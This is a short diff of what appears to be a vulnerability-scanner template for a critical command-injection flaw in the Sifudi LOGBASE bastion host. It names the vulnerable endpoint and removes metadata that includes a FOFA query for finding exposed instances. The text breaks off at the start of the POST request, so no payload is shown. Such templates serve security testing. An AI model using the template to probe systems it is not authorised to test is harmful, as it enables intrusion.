@@ -3,12 +3,8 @@ info:
   name: 思迪福堡垒机系统 get_qrcode_img_b 存在命令注入漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yiee0mzc0h99qnsc'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yiee0mzc0h99qnsc
-    fofa: app="思福迪-LOGBASE"
 http:
 - raw:
   - 'POST /bhost/get_qrcode_img_b HTTP/1.1
